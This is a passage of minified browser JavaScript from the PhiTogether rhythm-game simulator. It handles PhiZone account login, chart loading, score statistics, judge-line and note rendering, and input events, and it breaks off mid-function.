s=this.gameConfig.account;PhiZoneAPI.getUserBasicInfo(e).then(async r=>{s.userBasicInfo=r,recordMgr.reset(r),PhiZoneAPI.getUserConfigurations(e).then(async o=>{try{if(this.noAccountMode=!1,!s.defaultConfigID)s.defaultConfigID=o[0].id,s.defaultConfig=o[0];else{const l=o.findIndex(d=>d.id==s.defaultConfigID);l==-1?(s.defaultConfigID=o[0].id,s.defaultConfig=o[0]):s.defaultConfig=o[l]}msgHandler$1.sendMessage(this.$t("phizone.login.success",{userName:s.userBasicInfo.userName}),"success",!0),t(!0)}catch{n(!1)}finally{}}),PhiZoneAPI.getUserBestRecords(e,r.id).then(async o=>{try{s.pzBestRecords=o,t(!0)}catch{n(!1)}})}).catch(r=>{loadHandler.r("login"),n(!1)})})},cleanStr(e){return e&&e.replace(new RegExp([...e.matchAll(new RegExp("\\[PZ([A-Za-z]+):([0-9]+):((?:(?!:PZRT]).)*):PZRT\\]","g"))].length===0?"\\[PZ([A-Za-z]+):([0-9]+):([^\\]]+)\\]":"\\[PZ([A-Za-z]+):([0-9]+):((?:(?!:PZRT]).)*):PZRT\\]","gi"),"$3")},chartLoadedCB(){if(this.$route.path==="/chartUpload"){shared$1.game.adjustInfo(),$("uploader").classList.remove("disabled"),loadHandler.r("loadChart"),shared$1.game.userChartUploaded(),this.lastLoad=hook.chartsMD5.get(hook.selectchart.value);return}const e=JSON.parse(sessionStorage.getItem("loadedChart")),t=JSON.parse(sessionStorage.getItem("chartDetailsData"));this.lastLoad=e.id;const n=$("input-name"),s=$("input-artist"),r=$("input-charter"),o=$("input-illustrator"),l=$("select-difficulty"),d=$("select-level");n.value=t.name,o.value=t.illustrator,s.value=t.composer,r.value=this.cleanStr(e.charter),typeof e.difficulty=="string"?d.value=e.difficulty:d.value=e.difficulty===0?"?":Math.floor(e.difficulty).toString(),l.value=e.level,shared$1.game.updateLevelText(0),shared$1.game.updateLevelText(1);let u;u=localStorage.getItem("PTSavedOffsets"),u&&(u=JSON.parse(u),u[e.id]?this.chartOffsetSurface=u[e.id]:this.chartOffsetSurface=0),this.externalHooks.chartLoaded&&this.externalHooks.chartLoaded(t,e)},loadChart(e,t,n){if(!this.afterSimphiLoaded)return loadHandler.l(this.$t("loadChart.simphiLoading"),"simphiloading"),this.afterSimphiLoaded=()=>this.loadChart(e,t,n);const s={val:$("select-speed").selectedIndex,disp:$("select-speed").selectedOptions[0].value};recordMgr.chartInfo={songData:e,chartData:t,speedInfo:s};let r=[e.illustration,e.song,t.chart];if(t.assets)r.push(t.assets);else if(t.assetsNum)for(let l=0;l<t.assetsNum;l++)r.push(`/PTVirtual/assets/${t.id}/${l}`);if(sessionStorage.setItem("loadedChart",JSON.stringify(t)),sessionStorage.setItem("chartDetailsData",JSON.stringify(e)),t.customRes?shared$1.game.simphi.reloadRes(t.customRes):shared$1.game.simphi.reloadRes(),this.externalHooks.chartLoaded=n,this.lastLoad===t.id){this.chartLoadedCB();return}shared$1.game.clearStat();const o=r.length;uploader.reset(o),ptdb.chart.getChartsFiles.meta(t,e).then(async l=>{let d=0;const u={song:new Response(l[0]),illustration:new Response(l[1]),chart:new Response(l[2])};for(const f in u)d++,loadHandler.l(this.$t("loadChart.info",{loaded:d,resNum:o}),"loadChart"),uploader.fireLoad({name:`${t.id}/${f}`},await u[f].arrayBuffer());if(l[3])for(const f of l[3])d++,loadHandler.l(this.$t("loadChart.info",{loaded:d,resNum:o}),"loadChart"),uploader.fireLoad({name:f.name},await new Response(f.file).arrayBuffer())}).catch(l=>{msgHandler$1.sendMessage(this.$t("loadChart.failed"),"error"),loadHandler.r("loadChart"),console.error(l)})}}}),graphicHandler={wpHookList:[],resultHookList:[],whilePlayingHook:function(e,t,n){for(let s=0;s<this.wpHookList.length;s++)this.wpHookList[s](e,t,n)},resultHook:function(e,t){for(let n=0;n<this.resultHookList.length;n++)this.resultHookList[n](e,t)},register:function(e,t){e=="whilePlayingHook"?this.wpHookList.push(t):e=="resultHook"&&this.resultHookList.push(t)}};let scoreLoadingAndResultData={text:i18n.global.t("phizone.scoreUpload.uploading"),loaded:0,startTime:null,display:!1,data:null};function drawRoundRect$1(e,t,n,s,r,o){return s<2*o&&(o=s/2),r<2*o&&(o=r/2),e.beginPath(),e.moveTo(t+o,n),e.arcTo(t+s,n,t+s,n+r,o),e.arcTo(t+s,n+r,t,n+r,o),e.arcTo(t,n+r,t,n,o),e.arcTo(t,n,t+s,n,o),e.closePath(),e}graphicHandler.register("resultHook",function(e,t){if(!scoreLoadingAndResultData.display)return;scoreLoadingAndResultData.startTime||(scoreLoadingAndResultData.startTime=performance.now()),t.shadowBlur=20,t.shadowColor="#000000";const n=performance.now();let s=scoreLoadingAndResultData.text,r=(n-scoreLoadingAndResultData.startTime)%2e3;const o=n<scoreLoadingAndResultData.loaded;scoreLoadingAndResultData.loaded===1?(scoreLoadingAndResultData.loaded=n+2e3-r,r>1e3&&(r=2e3-r),s=i18n.global.t("phizone.scoreUpload.uploading")):scoreLoadingAndResultData.loaded===0||o?(r>1e3&&(r=2e3-r),o&&(s=i18n.global.t("phizone.scoreUpload.uploading"))):(r=n-scoreLoadingAndResultData.loaded,r>1e3&&(r=1e3));let d={length:t.measureText(s).width+350,baseY:975};drawRoundRect$1(t,960-d.length/2,d.baseY-40,d.length,80,30),t.fillStyle="#000000",t.globalAlpha=r/1e3*.5,t.fill(),t.fillStyle="#fff",t.textAlign="center",t.font="35px Saira",t.globalAlpha=r/1e3,t.fillText(s,960,d.baseY+5)});ptAppInstance.use(router);ptAppInstance.use(i18n);const multiPlayerInstance=createApp(multiplayerinst);multiPlayerInstance.use(i18n);multiPlayerInstance.mount("#multiplayer");const ptmain=ptAppInstance.mount("#app");document.getElementById("app").style.display="block";shared$1.game.ptmain=ptmain;shared$1.game.msgHandler=msgHandler$1;shared$1.game.loadHandler=loadHandler;shared$1.game.graphicHandler=graphicHandler;shared$1.game.recordMgr=recordMgr;shared$1.game.replayMgr=replayMgr;shared$1.game.init=!0;shared$1.game.i18n=i18n.global;shared$1.game.afterShow=[];shared$1.game.antiAddictionCallback=e=>ptmain.canplay=e;self.shared=shared$1;const $=e=>document.getElementById(e),stage$2=$("stage"),btnPlay$1=$("btn-play"),btnPause$1=$("btn-pause"),selectflip$1=$("select-flip"),scriptRel="modulepreload",assetsURL=function(e){return"/"+e},seen={},__vitePreload=function e(t,n,s){if(!n||n.length===0)return t();const r=document.getElementsByTagName("link");return Promise.all(n.map(o=>{if(o=assetsURL(o),o in seen)return;seen[o]=!0;const l=o.endsWith(".css"),d=l?'[rel="stylesheet"]':"";if(!!s)for(let m=r.length-1;m>=0;m--){const g=r[m];if(g.href===o&&(!l||g.rel==="stylesheet"))return}else if(document.querySelector(`link[href="${o}"]${d}`))return;const f=document.createElement("link");if(f.rel=l?"stylesheet":scriptRel,l||(f.as="script",f.crossOrigin=""),f.href=o,document.head.appendChild(f),l)return new Promise((m,g)=>{f.addEventListener("load",m),f.addEventListener("error",()=>g(new Error(`Unable to preload CSS for ${o}`)))})})).then(()=>t()).catch(o=>{const l=new Event("vite:preloadError",{cancelable:!0});if(l.payload=o,window.dispatchEvent(l),!l.defaultPrevented)throw o})};class Stat{constructor(){this.level=0,this.noteRank=[0,0,0,0,0,0,0,0],this.combos=[0,0,0,0,0],this.cumDisp=0,this.curDisp=0,this.numDisp=0,this.maxcombo=0,this.combo=0}get good(){return this.noteRank[7]+this.noteRank[3]}get bad(){return this.noteRank[6]+this.noteRank[2]}get great(){return this.noteRank[5]+this.noteRank[1]}get perfect(){return this.noteRank[4]+this.great}get all(){return this.perfect+this.good+this.bad}get scoreNum(){const t=1e6*(this.perfect*.9+this.good*.585+this.maxcombo*.1)/this.numOfNotes;return isFinite(t)?t:0}get scoreStr(){const t=this.scoreNum.toFixed(0);return"0".repeat(t.length<7?7-t.length:0)+t}get accNum(){if(this.combos[0]===0)return 0;const t=(this.perfect+this.good*.65)/this.all;return isFinite(t)?t:1}get accStr(){return(100*this.accNum).toFixed(2)+"%"}get avgDispStr(){const t=Math.trunc(this.cumDisp/this.numDisp*1e3)||0;return`${t>0?"+":""}${t.toFixed(0)}ms`}get curDispStr(){const t=Math.trunc(this.curDisp*1e3);return`${t>0?"+":""}${t.toFixed(0)}ms`}get life(){const t=1e3-this.good*1-this.bad*10-this.noteRank[2]*40;return t>0?t:0}get lineStatus(){return this.bad?0:this.good?3:1}get rankStatus(){const t=Math.round(this.scoreNum);return t>=1e6?0:t>=96e4?1:t>=92e4?2:t>=88e4?3:t>=82e4?4:t>=7e5?5:6}get localData(){const t=Math.round(this.accNum*1e4+566).toString(22).slice(-3),n=Math.round(this.scoreNum+40672).toString(32).slice(-4),s=this.level.toString(36).slice(-1);return t+n+s}getData(t,n=""){const s=this.data[this.id].slice(0,3),r=this.data[this.id].slice(3,7),o=Math.round(this.accNum*1e4+566).toString(22).slice(-3),l=Math.round(this.scoreNum+40672).toString(32).slice(-4),d=this.level.toString(36).slice(-1),u=(parseInt(r,32)-40672).toFixed(0),f="0".repeat(u.length<7?7-u.length:0)+u,m=Math.abs(f-this.scoreStr).toString().padStart(7,"0");t||(this.data[this.id]=(s>o?s:o)+(r>l?r:l)+d);const g=[];for(const v in this.data)g.push(v+this.data[v]);replayMgr.replaying||localStorage.setItem(`phi-${n}`,g.sort(()=>Math.random()-.5).join(""));const y={newBestColor:r<l?"#18ffbf":"#fff",newBestStr:r<l?"NEW BEST":" ",scoreBest:f,scoreDelta:r>l?" ":"+"+m,textAboveColor:"#65fe43",textAboveStr:"SPEED {SPEED}x",textBelowColor:"#fe4365",textBelowStr:"AUTO PLAY"};return t?Object.assign(y,{newBestColor:"#fff",scoreBest:"0000000",newBestStr:"PREVIEW",scoreDelta:"+1000000"}):this.lineStatus===1?Object.assign(y,{textBelowStr:"ALL  PERFECT",textBelowColor:"#ffc500"}):this.lineStatus===3?Object.assign(y,{textBelowStr:"FULL  COMBO",textBelowColor:"#00bef1"}):Object.assign(y,{textBelowStr:""})}reset(t,n,s=""){this.numOfNotes=Number(t)||0,this.combo=0,this.maxcombo=0,this.noteRank=[0,0,0,0,0,0,0,0],this.combos=[0,0,0,0,0],this.cumDisp=0,this.curDisp=0,this.numDisp=0,this.data={},this.resetSpeed(s),n&&(this.data[n]||(this.data[n]=this.localData),this.id=n)}resetSpeed(t=""){const n=`phi-${t}`;t===""&&localStorage.getItem("phi")&&(localStorage.setItem(n,localStorage.getItem("phi")),localStorage.removeItem("phi")),localStorage.getItem(n)===null&&localStorage.setItem(n,"");const s=localStorage.getItem(n);for(let r=0;r<Math.floor(s.length/40);r++){const o=s.slice(r*40,r*40+40);this.data[o.slice(0,32)]=o.slice(-8)}}addCombo(t,n){this.noteRank[t]++,this.combo=t%4===2?0:this.combo+1,this.combo>this.maxcombo&&(this.maxcombo=this.combo),this.combos[0]++,this.combos[n]++}addDisp(t){this.curDisp=t,this.cumDisp+=t,this.numDisp++}}class Renderer{constructor(t){if(!(t instanceof HTMLDivElement))throw new Error("Not a container");this.stage=t,this.canvas=document.createElement("canvas"),this.ctx=this.canvas.getContext("2d",{alpha:!1}),this.canvasos=document.createElement("canvas"),this.ctxos=this.canvasos.getContext("2d"),this.stage.appendChild(this.canvas),this.canvas.style.cssText=";position:absolute;top:0px;left:0px;right:0px;bottom:0px;",this.isFull=!1,console.log("Hello, PhiTogether(extended from lchzh3473/sim-phi)!"),this.speed=1,this.chart={},this.lineScale=57.6,this.noteScale=1.15,this.noteScaleRatio=8e3,this.brightness=.6,this.multiHint=!0,this.playMode=1,this.musicVolume=1,this.soundVolume=1,this._mirrorType=0,this.enableFR=!1,this.enableVP=!1,this.chart=null,this.bgImage=null,this.bgImageBlur=null,this.bgMusic=null,this.bgVideo=null,this.lines=[],this.notes=[],this.taps=[],this.drags=[],this.flicks=[],this.holds=[],this.linesReversed=[],this.notesReversed=[],this.tapsReversed=[],this.dragsReversed=[],this.flicksReversed=[],this.holdsReversed=[],this.tapholds=[],this.offScreenCanvases={},this._setLowResFactor(1),this.resizeCanvas()}init(t){}setNoteScale(t){this.noteScale=Number(t)||1,this.noteScaleRatio=this.canvasos.width*this.noteScale/8080}_setLowResFactor(t){this.lowResFactor=t*self.devicePixelRatio}setLowResFactor(t){this._setLowResFactor(Number(t)||1),this._resizeCanvas()}_resizeCanvas(){const{canvas:t,canvasos:n,width:s,height:r}=this,o=s*this.lowResFactor,l=r*this.lowResFactor;t.width=o,t.height=l,n.width=Math.min(o,l*16/9),t.width-n.width===this.lowResFactor&&(n.width=t.width),n.height=l;for(const d in this.offScreenCanvases)this.offScreenCanvases[d].resetScale();this.wlen=n.width/2,this.hlen=n.height/2,this.mirrorView(),this.setNoteScale(this.noteScale),this.lineScale=n.width>n.height*.75?n.height/18.75:n.width/14.0625}resizeCanvas(){const{clientWidth:t,clientHeight:n}=this.stage;this.width===t&&this.height===n||(this.width=t,this.height=n,this.canvas.style.cssText+=`;width:${t}px;height:${n}px;top:0px;`,this._resizeCanvas())}mirrorView(t=this._mirrorType){const n=this._mirrorType=3&t;this.transformView(1&n?-1:1,2&n?-1:1,0,0)}transformView(t=1,n=1,s=0,r=0){const{canvasos:o}=this,l=o.width*t,d=(o.width-l)*.5,u=-o.height*n,f=(o.height-u)*.5,m=-Math.sign(t*n)*Math.PI/180,g=n>0?0:Math.PI,y=Math.sign(n)*l*.05625,v=Math.sign(n)*-u*.6;this.matX=x=>d+l*(x-s),this.matY=x=>f+u*(x-r),this.matR=x=>g+m*x,this.scaleX=y,this.scaleY=v}prerenderChart(t){this.lines.length=0,this.notes.length=0,this.taps.length=0,this.drags.length=0,this.flicks.length=0,this.holds.length=0,this.tapholds.length=0;const n=new Chart(t);let s=0;const r=(u,f)=>{for(const m of u)m.startRealTime=m.startTime/f*1.875,m.endRealTime=m.endTime/f*1.875,m.startTime>1-1e6&&m.startRealTime>s&&(s=m.startRealTime),m.endTime<1e9&&m.endRealTime>s&&(s=m.endRealTime)},o=(u,f,m,g,y)=>{u.offsetX=0,u.offsetY=0,u.alpha=0,u.realTime=u.time*f,u.realHoldTime=u.holdTime*f,u.line=m,u.lineId=m.lineId,u.noteId=g,u.isAbove=y,u.name=`${m.lineId}${y?"+":"-"}${g}${"?tdhf"[u.type]}`,this.notes.push(u),u.type===1?this.taps.push(u):u.type===2?this.drags.push(u):u.type===3?this.holds.push(u):u.type===4&&this.flicks.push(u),(u.type===1||u.type===3)&&this.tapholds.push(u)},l=(u,f)=>u.realTime-f.realTime||u.lineId-f.lineId||u.noteId-f.noteId;n.judgeLineList.forEach((u,f)=>u.lineId=f);for(const u of n.judgeLineList)u.bpm*=this.speed,u.offsetX=0,u.offsetY=0,u.alpha=0,u.rotation=0,u.positionY=0,u.speedEvents=normalizeSpeedEvent(u.speedEvents),u.judgeLineDisappearEvents=normalizeLineEvent(u.judgeLineDisappearEvents),u.judgeLineMoveEvents=normalizeLineEvent(u.judgeLineMoveEvents),u.judgeLineRotateEvents=normalizeLineEvent(u.judgeLineRotateEvents),u.judgeLineColorEvents=normalizeLineEvent(u.judgeLineColorEvents||[]),u.judgeLineTextEvents=normalizeLineEvent(u.judgeLineTextEvents||[]),u.judgeLineScaleXEvents=normalizeLineEvent(u.judgeLineScaleXEvents||[]),u.judgeLineScaleYEvents=normalizeLineEvent(u.judgeLineScaleYEvents||[]),r(u.speedEvents,u.bpm),r(u.judgeLineDisappearEvents,u.bpm),r(u.judgeLineMoveEvents,u.bpm),r(u.judgeLineRotateEvents,u.bpm),r(u.judgeLineColorEvents,u.bpm),r(u.judgeLineTextEvents,u.bpm),r(u.judgeLineScaleXEvents,u.bpm),r(u.judgeLineScaleYEvents,u.bpm),this.lines.push(u),u.notesAbove.forEach((f,m)=>o(f,1.875/u.bpm,u,m,!0)),u.notesBelow.forEach((f,m)=>o(f,1.875/u.bpm,u,m,!1));this.notes.sort(l),this.taps.sort(l),this.drags.sort(l),this.holds.sort(l),this.flicks.sort(l),this.notesReversed=this.notes.slice().reverse(),this.tapsReversed=this.taps.slice().reverse(),this.dragsReversed=this.drags.slice().reverse(),this.holdsReversed=this.holds.slice().reverse(),this.flicksReversed=this.flicks.slice().reverse(),this.linesReversed=this.lines.slice().reverse(),this.tapholds.sort(l);const d={};for(const u of this.notes)d[u.realTime.toFixed(6)]=d[u.realTime.toFixed(6)]?2:1;for(const u of this.notes)u.isMulti=d[u.realTime.toFixed(6)]===2;for(let u=0;u<this.flicks.length;u++){const f=this.flicks[u];f.nearNotes=[];for(let m=u+1;m<this.flicks.length;m++){const g=this.flicks[m];if(Math.fround(g.realTime-f.realTime)>.01)break;f.nearNotes.push(g)}}for(let u=0;u<this.tapholds.length;u++){const f=this.tapholds[u];f.nearNotes=[];for(let m=u+1;m<this.tapholds.length;m++){const g=this.tapholds[m];if(Math.fround(g.realTime-f.realTime)>.01)break;f.nearNotes.push(g)}}this.chart=n}updateByTime(t){for(const n of this.lines){for(const l of n.judgeLineDisappearEvents){if(t<l.startRealTime)break;if(t>l.endRealTime)continue;const d=(t-l.startRealTime)/(l.endRealTime-l.startRealTime);n.alpha=l.start+(l.end-l.start)*d}for(const l of n.judgeLineMoveEvents){if(t<l.startRealTime)break;if(t>l.endRealTime)continue;const d=(t-l.startRealTime)/(l.endRealTime-l.startRealTime);n.realX=l.start+(l.end-l.start)*d,n.realY=l.start2+(l.end2-l.start2)*d,n.offsetX=this.matX(n.realX),n.offsetY=this.matY(n.realY)}for(const l of n.judgeLineRotateEvents){if(t<l.startRealTime)break;if(t>l.endRealTime)continue;const d=(t-l.startRealTime)/(l.endRealTime-l.startRealTime);n.rotation=this.matR(l.start+(l.end-l.start)*d),n.cosr=Math.cos(n.rotation),n.sinr=Math.sin(n.rotation)}for(const l of n.judgeLineColorEvents){if(t<l.startRealTime)break;if(t>l.endRealTime)continue;const d=(t-l.startRealTime)/(l.endRealTime-l.startRealTime);n.color=l.start==0||l.end==0?null:rgb2hex(l.start.split(",").map((u,f)=>{u=Number(u);const m=Number(l.end.split(",")[f]);return Math.round(u+d*(m-u))}))}for(const l of n.judgeLineTextEvents){if(t<l.startRealTime)break;if(!(t>l.endRealTime))if(l.start&&(l.start.includes("%P%")||l.end.includes("%P%"))){const d=(t-l.startRealTime)/(l.endRealTime-l.startRealTime),u=Number(l.start.replace("%P%","")),f=Number(l.end.replace("%P%",""));isNaN(u)||isNaN(f)?n.text=l.start||null:n.text=(u+d*(f-u)).toFixed(l.start.includes(".")||l.end.includes(".")?3:0)}else n.text=l.start||null}for(const l of n.judgeLineScaleXEvents){if(t<l.startRealTime)break;if(t>l.endRealTime)continue;const d=(t-l.startRealTime)/(l.endRealTime-l.startRealTime);n.scaleX=l.start+d*(l.end-l.start)}for(const l of n.judgeLineScaleYEvents){if(t<l.startRealTime)break;if(t>l.endRealTime)continue;const d=(t-l.startRealTime)/(l.endRealTime-l.startRealTime);n.scaleY=l.start+d*(l.end-l.start)}for(const l of n.speedEvents){if(t<l.startRealTime)break;t>l.endRealTime||(n.positionY=(t-l.startRealTime)*l.value*this.speed+(this.enableFR?l.floorPosition2:l.floorPosition))}const s=l=>l.type!==3?(l.floorPosition-n.positionY)*l.speed:l.realTime<t?(l.realTime-t)*l.speed*this.speed:l.floorPosition-n.positionY,r=l=>l.badtime?(performance.now()-l.badtime>500&&delete l.badtime,l.badY||(l.badY=s(l)),l.badY):s(l),o=(l,d,u)=>{l.projectX=n.offsetX+d*l.cosr,l.offsetX=l.projectX+u*l.sinr,l.projectY=n.offsetY+d*l.sinr,l.offsetY=l.projectY-u*l.cosr,l.visible=l.realTime-l.visibleTime>t||l.line.alpha<-Number.EPSILON&&(l.line.alpha*255>=-1||l.line.alpha*255>=-2&&l.line.positionY*(l.isAbove?-1:1)>0)?!1:(l.offsetX-this.wlen)**2+(l.offsetY-this.hlen)**2<(this.wlen*1.23625+this.hlen+this.scaleY*l.realHoldTime*l.speed*this.speed)**2,l.showPoint=!1,l.badtime||(l.realTime>t?(l.showPoint=!0,l.alpha=u<=-.001*this.scaleY||this.enableVP&&s(l)*.6>2||l.type===3&&l.speed===0?0:1):(l.frameCount=l.frameCount==null?0:l.frameCount+1,l.type===3?(l.showPoint=!0,l.alpha=l.speed===0?0:l.status%4===2?.45:1):l.alpha=Math.max(1-(t-l.realTime)/.16,0))),l.alpha*=l.realAlpha};for(const l of n.notesAbove)l.cosr=n.cosr,l.sinr=n.sinr,o(l,this.scaleX*l.positionX,this.scaleY*r(l));for(const l of n.notesBelow)l.cosr=-n.cosr,l.sinr=-n.sinr,o(l,-this.scaleX*l.positionX,this.scaleY*r(l))}}}class OffScreenCanvas{constructor(t,n){this.canvasos=document.createElement("canvas"),this.ctxos=this.canvasos.getContext("2d"),this.stat="",this.mainCanvas=n,this.resetScale(),this.updateCanvas=t}resetScale(){this.canvasos.width=this.mainCanvas.width,this.canvasos.height=this.mainCanvas.height}clearCanvas(){this.ctxos.clearRect(0,0,this.canvasos.width,this.canvasos.height)}update(t){return this.clearCanvas(),this.updateCanvas(this,...t),this.canvasos}get(t,n=!1,s=[]){return t&&this.stat==t&&!n?this.canvasos:(this.stat=t,this.update(s))}}class HitEvent{constructor(t,n,s,r){this.type=t,this.id=n,this.realX=Number(s),this.realY=Number(r),this.isActive=!0,this.isTapped=!1,this.isMoving=!1,this.lastDeltaX=0,this.lastDeltaY=0,this.nowDeltaX=0,this.nowDeltaY=0,this.deltaTime=0,this.currentTime=performance.now(),this.flicking=!1,this.flicked=!1}get offsetX(){return shared$1.game.ptmain.gameConfig.fullScreenJudge?NaN:this.realX}get offsetY(){return shared$1.game.ptmain.gameConfig.fullScreenJudge?NaN:this.realY}move(t,n){this.lastDeltaX=this.nowDeltaX,this.lastDeltaY=this.nowDeltaY,this.nowDeltaX=t-this.realX,this.nowDeltaY=n-this.realY,this.realX=t,this.realY=n;const s=performance.now();this.deltaTime=s-this.currentTime,this.currentTime=s,this.isMoving=!0;const r=(this.nowDeltaX*this.lastDeltaX+this.nowDeltaY*this.lastDeltaY)/Math.sqrt(this.lastDeltaX**2+this.lastDeltaY**2)/this.deltaTime;this.flicking&&r<.3?(this.flicking=!1,this.flicked=!1):!this.flicking&&r>.8&&(this.flicking=!0)}}class HitManager{constructor(){this.list=[]}activate(t,n,s,r){const{list:o}=this,l=o.findIndex(d=>d.type===t&&d.id===n);l!==-1&&o.splice(l,1),o.push(new HitEvent(t,n,s,r))}moving(t,n,s,r){const o=this.list.find(l=>l.type===t&&l.id===n);o&&o.move(s,r)}deactivate(t,n){const s=this.list.find(r=>r.type===t&&r.id===n);s&&(s.isActive=!1)}update(){const{list:t}=this;for(let n=0;n<t.length;n++){const s=t[n];s.isActive?(s.isTapped=!0,s.isMoving=!1):t.splice(n--,1)}}clear(t){for(const n of this.list)n.type===t&&this.deactivate(t,n.id)}}class Chart{constructor(t){t=t||{},this.formatVersion=parseInt(t.formatVersion)||0,this.offset=parseFloat(t.offset||0),this.offsetBak=parseFloat(t.offset)||0,this.chartRPE=t.chartRPE||null,this.chartPec=t.chartPec||null,this.numOfNotes=parseInt(t.numOfNotes)||0,this.judgeLineList=Array.isArray(t.judgeLineList)?t.judgeLineList.map(n=>new JudgeLine(n)):[],getAdjustedOffset(t).then(n=>this.offset=n).catch(n=>n)}}class JudgeLine{constructor(t){t=t||{},this.numOfNotes=parseInt(t.numOfNotes)||0,this.numOfNotesAbove=parseInt(t.numOfNotesAbove)||0,this.numOfNotesBelow=parseInt(t.numOfNotesBelow)||0,this.attachUI=t.attachUI,this.bpm=parseFloat(t.bpm)||0,this.speed=0,this.speedEvents=Array.isArray(t.speedEvents)?t.speedEvents.map(n=>new SpeedEvent(n)):[],this.notesAbove=Array.isArray(t.notesAbove)?t.notesAbove.map(n=>new Note(n)):[],this.notesBelow=Array.isArray(t.notesBelow)?t.notesBelow.map(n=>new Note(n)):[],this.judgeLineDisappearEvents=Array.isArray(t.judgeLineDisappearEvents)?t.judgeLineDisappearEvents.map(n=>new LineEvent(n)):[],this.judgeLineMoveEvents=Array.isArray(t.judgeLineMoveEvents)?t.judgeLineMoveEvents.map(n=>new LineEvent(n)):[],this.judgeLineRotateEvents=Array.isArray(t.judgeLineRotateEvents)?t.judgeLineRotateEvents.map(n=>new LineEvent(n)):[],this.judgeLineColorEvents=Array.isArray(t.judgeLineColorEvents)?t.judgeLineColorEvents.map(n=>new LineEvent(n)):[],this.judgeLineTextEvents=Array.isArray(t.judgeLineTextEvents)?t.judgeLineTextEvents.map(n=>new LineEvent(n)):[],this.judgeLineScaleXEvents=Array.isArray(t.judgeLineScaleXEvents)?t.judgeLineScaleXEvents.map(n=>new LineEvent(n)):[],this.judgeLineScaleYEvents=Array.isArray(t.judgeLineScaleYEvents)?t.judgeLineScaleYEvents.map(n=>new LineEvent(n)):[]}}class SpeedEvent{constructor(t){t=t||{},this.startTime=parseInt(t.startTime)||0,this.endTime=parseInt(t.endTime)||0,this.value=parseFloat(t.value)||0,this.floorPosition=parseFloat(t.floorPosition)||0,this.floorPosition2=parseFloat(t.floorPosition2)||0}}class Note{constructor(t){t=t||{},this.type=parseInt(t.type)||0,this.time=parseInt(t.time)||0,this.isFake=t.isFake||!1,this.visibleTime=parseFloat(t.visibleTime)||1/0,this.positionX=parseFloat(t.positionX)||0,this.holdTime=parseInt(t.holdTime)||0,this.speed=parseFloat(t.speed)||0,this.floorPosition=parseFloat(t.floorPosition)||0,this.realAlpha=parseFloat(t.alpla||t.alpha===0?t.alpha:1),this.size=t.size||1}}class LineEvent{constructor(t){t=t||{},this.startTime=parseInt(t.startTime)||0,this.endTime=parseInt(t.endTime)||0,this.start=typeof t.start=="string"?t.start:parseFloat(t.start)||0,this.end=typeof t.start=="string"?t.end:parseFloat(t.end)||0,this.start2=parseFloat(t.start2)||0,this.end2=parseFloat(t.end2)||0}}function normalizeLineEvent(e=[]){const t=e.map(r=>new LineEvent(r));if(!t.length)return[new LineEvent({startTime:-999999,endTime:1e9})];const n=[new LineEvent({startTime:-999999,endTime:0,start:t[0].start,end:t[0].start,start2:t[0].start2,end2:t[0].start2})];t.push(new LineEvent({startTime:t[t.length-1].endTime,endTime:1e9,start:t[t.length-1].end,end:t[t.length-1].end,start2:t[t.length-1].end2,end2:t[t.length-1].end2}));for(const r of t){if(r.startTime>r.endTime)continue;const o=n[n.length-1];o.endTime>r.endTime||(o.endTime===r.startTime?n.push(r):o.endTime<r.startTime?n.push(new LineEvent({startTime:o.endTime,endTime:r.startTime,start:o.end,end:o.end,start2:o.end2,end2:o.end2}),r):o.endTime>r.startTime&&n.push(new LineEvent({startTime:o.endTime,endTime:r.endTime,start:(r.start*(r.endTime-o.endTime)+r.end*(o.endTime-r.startTime))/(r.endTime-r.startTime),end:o.end,start2:(r.start2*(r.endTime-o.endTime)+r.end2*(o.endTime-r.startTime))/(r.endTime-r.startTime),end2:o.end2})))}const s=[n.shift()];for(const r of n){const o=s[s.length-1],l=o.endTime-o.startTime,d=r.endTime-r.startTime;r.startTime===r.endTime||(o.end===r.start&&o.end2===r.start2&&(o.end-o.start)*d===(r.end-r.start)*l&&(o.end2-o.start2)*d===(r.end2-r.start2)*l?(o.endTime=r.endTime,o.end=r.end,o.end2=r.end2):s.push(r))}return s}function normalizeSpeedEvent(e=[]){const t=[];for(const n of e){const s=t[t.length-1];s&&s.value===n.value?s.endTime=n.endTime:t.push(new SpeedEvent(n))}return t}function rgb2hex(e){return"#"+e.map(r=>typeof r!="number"||r<0||r>255?255:r).map(r=>{const o=r.toString(16).toUpperCase();return o.length===1?"0"+o:o}).join("")}function getAdjustedOffset(e){return new Promise(t=>{ptdb.gameConfig.get("savedChartOffsets").then(n=>{(!n||!e.md5||!n[e.md5])&&t(parseFloat(e.offset)||0),t(parseFloat(n[e.md5]))}).catch(n=>t(e.offset||0))})}const simphi={Stat,Renderer,HitManager,OffScreenCanvas},bitmapUrl="/assets/createImageBitmap-7c318a9d.js",webpUrl="/assets/webp-bundle-e4c576a4.js",urls={jszip:["/lib/jszip.js"],bitmap:[bitmapUrl],webp:[webpUrl]};function loadJS(e){const t=Array.from(e instanceof Array?e:arguments,r=>new URL(r,location).href),n=function*(r){yield*r}(t),s=r=>new Promise((o,l)=>{if(!r)return l(new DOMException(`All urls are invalid
`+t.join(`
`),"NetworkError"));const d=document.createElement("script");d.onload=()=>o(d),d.onerror=()=>s(n.next().value).then(u=>o(u)).catch(u=>l(u)),d.src=r,d.crossOrigin="anonymous",document.head.appendChild(d)});return s(n.next().value)}class Interact{constructor(t){this.element=t,this.callbacks=[]}setMouseEvent({mousedownCallback:t=function(){},mousemoveCallback:n=function(){},mouseupCallback:s=function(){},mouseoutCallback:r=function(){}}){const o=f=>{f.preventDefault(),t(f)},l=f=>{n(f)},d=f=>{s(f)},u=f=>{r(f)};return this.element.addEventListener("mousedown",o),self.addEventListener("mousemove",l),self.addEventListener("mouseup",d),this.element.addEventListener("mouseout",u),this.callbacks.push({mousedown:o,mousemove:l,mouseup:d,mouseout:u})}clearMouseEvent(t){const{mousedown:n,mousemove:s,mouseup:r,mouseout:o}=this.callbacks[t-1];this.element.removeEventListener("mousedown",n),self.removeEventListener("mousemove",s),self.removeEventListener("mouseup",r),this.element.removeEventListener("mouseout",o),this.callbacks[t-1]=null}setTouchEvent({touchstartCallback:t=function(){},touchmoveCallback:n=function(){},touchendCallback:s=function(){},touchcancelCallback:r=function(){}}){const o={passive:!1},l=m=>{m.preventDefault(),t(m)},d=m=>{m.preventDefault(),n(m)},u=m=>{m.preventDefault(),s(m)},f=m=>{m.preventDefault(),r(m)};return 